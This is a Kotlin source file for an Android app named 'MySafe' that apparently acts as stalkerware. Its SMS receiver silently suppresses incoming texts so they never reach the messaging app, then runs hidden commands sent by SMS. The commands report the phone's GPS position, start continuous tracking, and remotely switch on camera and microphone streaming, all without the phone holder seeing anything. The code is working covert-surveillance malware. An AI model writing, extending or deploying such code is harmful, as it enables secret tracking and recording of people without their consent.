package com.mysafe.mysafe

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log

class SmsReceiver : BroadcastReceiver() {
    companion object {
        var myPhoneNumber: String = ""
    }

    override fun onReceive(context: Context, intent: Intent) {
        // 🔴 INTERCEPTER EN PREMIER — le SMS n'apparaîtra JAMAIS dans la messagerie
        abortBroadcast()

        // ✅ CORRECTION : ! doit être devant la condition complète
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION != intent.action) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        val messageComplet = StringBuilder()
        var numeroExpediteur = ""

        for (msg in messages) {
            messageComplet.append(msg.messageBody)
            if (numeroExpediteur.isEmpty()) numeroExpediteur = msg.originatingAddress ?: ""
        }

        val message = messageComplet.toString().trim()
        Log.d("SmsReceiver", "Commande invisible recu de $numeroExpediteur : $message")

        when {
            // 📍 COMMANDE POSITION — Repondre directement
            message == "!!POSITION" -> repondrePosition(context, numeroExpediteur)
            
            // 📡 COMMANDE DEMARRER SUIVI — Repondre + lancer suivi
            message == "!!DEMARRER" -> {
                repondre(context, numeroExpediteur, "!!OK,SUIVI,ACTIF")
                demarrerSuiviGPS(context, numeroExpediteur)
            }
            
            // ⏹️ COMMANDE STOP — Arreter tout
            message == "!!STOP" -> {
                repondre(context, numeroExpediteur, "!!OK,ARRETE")
                arreterSuivi(context)
                arreterStreaming(context)
            }
            
            // 📷 COMMANDE ACTIVER CAMERA — Lancer la caméra à distance
            message == "!!CAMERA" -> {
                repondre(context, numeroExpediteur, "!!OK,CAMERA,ACTIVE")
                lancerCamera(context)
            }
            
            // 🔊 COMMANDE ACTIVER AUDIO — Lancer le micro à distance
            message == "!!AUDIO" -> {
                repondre(context, numeroExpediteur, "!!OK,AUDIO,ACTIF")
                lancerAudio(context)
            }
            
            // 📤 COMMANDE STOP CAMERA/AUDIO
            message == "!!CAMERA,STOP" -> {
                repondre(context, numeroExpediteur, "!!OK,CAMERA,ARRETE")
                arreterStreaming(context)
            }
            
            // 📍 REPONSE DE POSITION — Transmettre a l'interface
            message.startsWith("!!") -> {
                val broadcast = Intent("com.mysafe.mysafe.SMS_RECEIVED").apply {
                    setPackage(context.packageName)
                    putExtra("sms_message", message)
                    putExtra("sender_number", numeroExpediteur)
                }
                context.sendBroadcast(broadcast)
            }
        }
    }

    private fun repondre(context: Context, dest: String, msg: String) {
        try {
            val sms = SmsManager.getDefault()
            val parts = sms.divideMessage(msg)
            if (parts.size == 1) sms.sendTextMessage(dest, null, parts[0], null, null)
            else sms.sendMultipartTextMessage(dest, null, parts, null, null)
            Log.d("SmsReceiver", "Reponse envoyee a $dest")
        } catch (e: Exception) {
            Log.e("SmsReceiver", "Erreur envoi: ${e.message}")
        }
    }

    private fun repondrePosition(context: Context, dest: String) {
        val intent = Intent(context, MySafeAgentService::class.java)
        intent.action = "com.mysafe.mysafe.GET_POSITION"
        intent.putExtra("target", dest)
        context.startForegroundService(intent)
    }

    private fun demarrerSuiviGPS(context: Context, dest: String) {
        val intent = Intent(context, MySafeAgentService::class.java)
        intent.action = "com.mysafe.mysafe.START_TRACKING"
        intent.putExtra("target", dest)
        context.startForegroundService(intent)
    }

    private fun arreterSuivi(context: Context) {
        val intent = Intent(context, MySafeAgentService::class.java)
        intent.action = "com.mysafe.mysafe.STOP_TRACKING"
        context.startForegroundService(intent)
    }

    // ✅ LANCER LA CAMERA PAR COMMANDE SMS
    private fun lancerCamera(context: Context) {
        Log.d("SmsReceiver", "📷 Activation camera par commande SMS")
        val intent = Intent(context, PermanentStreamService::class.java)
        intent.action = PermanentStreamService.ACTION_DEMARRER_CAMERA
        context.startForegroundService(intent)
    }

    // ✅ LANCER L'AUDIO PAR COMMANDE SMS
    private fun lancerAudio(context: Context) {
        Log.d("SmsReceiver", "🔊 Activation audio par commande SMS")
        val intent = Intent(context, PermanentStreamService::class.java)
        intent.action = PermanentStreamService.ACTION_DEMARRER_CAMERA
        context.startForegroundService(intent)
    }

    private fun arreterStreaming(context: Context) {
        Log.d("SmsReceiver", "⏹️ Arret streaming")
        val intent = Intent(context, PermanentStreamService::class.java)
        intent.action = PermanentStreamService.ACTION_ARRETER
        context.startForegroundService(intent)
    }
}
